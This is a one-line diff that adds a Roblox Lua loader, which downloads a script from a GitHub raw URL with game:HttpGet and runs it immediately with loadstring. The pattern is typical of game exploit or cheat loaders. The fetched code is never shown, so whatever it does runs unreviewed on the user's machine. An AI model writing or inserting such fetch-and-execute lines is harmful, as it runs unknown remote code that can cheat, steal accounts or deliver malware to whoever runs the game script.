@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/TokyoOverlord/wat/main/aaa.lua'))()
